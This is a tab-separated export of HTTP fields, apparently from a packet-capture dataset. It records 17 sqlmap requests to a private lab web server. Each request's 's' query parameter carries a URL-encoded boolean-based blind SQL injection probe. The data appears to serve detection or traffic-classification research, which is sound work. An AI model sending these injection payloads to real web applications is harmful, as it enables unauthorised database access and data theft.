http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%29%29%20AND%207877%3D7877%20AND%20%28%28%27PyCo%27%20LIKE%20%27PyCo		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%29%29%20AND%207877%3D7877%20AND%20%28%28%27PyCo%27%20LIKE%20%27PyCo
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%29%29%20AND%206075%3D6891%20AND%20%28%28%27uhYZ%27%20LIKE%20%27uhYZ		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%29%29%20AND%206075%3D6891%20AND%20%28%28%27uhYZ%27%20LIKE%20%27uhYZ
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%25%27%20AND%204595%3D6447%20AND%20%27ewZf%25%27%3D%27ewZf		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%25%27%20AND%204595%3D6447%20AND%20%27ewZf%25%27%3D%27ewZf
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%25%27%20AND%207877%3D7877%20AND%20%27aWUp%25%27%3D%27aWUp		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%25%27%20AND%207877%3D7877%20AND%20%27aWUp%25%27%3D%27aWUp
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%25%27%20AND%201961%3D7845%20AND%20%27Ttbw%25%27%3D%27Ttbw		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%25%27%20AND%201961%3D7845%20AND%20%27Ttbw%25%27%3D%27Ttbw
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%20AND%204051%3D1314%20AND%20%27SiYu%27%20LIKE%20%27SiYu		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%20AND%204051%3D1314%20AND%20%27SiYu%27%20LIKE%20%27SiYu
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%20AND%207877%3D7877%20AND%20%27rPgv%27%20LIKE%20%27rPgv		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%20AND%207877%3D7877%20AND%20%27rPgv%27%20LIKE%20%27rPgv
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%20AND%208077%3D9901%20AND%20%27jnko%27%20LIKE%20%27jnko		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%20AND%208077%3D9901%20AND%20%27jnko%27%20LIKE%20%27jnko
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%29%20AND%208382%3D7372%20AND%20%28%22qyVg%22%3D%22qyVg		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%29%20AND%208382%3D7372%20AND%20%28%22qyVg%22%3D%22qyVg
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%29%20AND%207877%3D7877%20AND%20%28%22HXWx%22%3D%22HXWx		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%29%20AND%207877%3D7877%20AND%20%28%22HXWx%22%3D%22HXWx
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%29%20AND%205508%3D4811%20AND%20%28%22wFxo%22%3D%22wFxo		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%29%20AND%205508%3D4811%20AND%20%28%22wFxo%22%3D%22wFxo
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%29%29%20AND%208930%3D5193%20AND%20%28%28%22JuFr%22%3D%22JuFr		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%29%29%20AND%208930%3D5193%20AND%20%28%28%22JuFr%22%3D%22JuFr
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%29%29%20AND%207877%3D7877%20AND%20%28%28%22sxyB%22%3D%22sxyB		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%29%29%20AND%207877%3D7877%20AND%20%28%28%22sxyB%22%3D%22sxyB
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%29%29%20AND%207558%3D3099%20AND%20%28%28%22HcWl%22%3D%22HcWl		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%29%29%20AND%207558%3D3099%20AND%20%28%28%22HcWl%22%3D%22HcWl
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%20AND%201422%3D2269%20AND%20%22opdp%22%3D%22opdp		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%20AND%201422%3D2269%20AND%20%22opdp%22%3D%22opdp
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%20AND%207877%3D7877%20AND%20%22nmLu%22%3D%22nmLu		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%20AND%207877%3D7877%20AND%20%22nmLu%22%3D%22nmLu
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%22%20AND%203233%3D9761%20AND%20%22xVzA%22%3D%22xVzA		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%22%20AND%203233%3D9761%20AND%20%22xVzA%22%3D%22xVzA
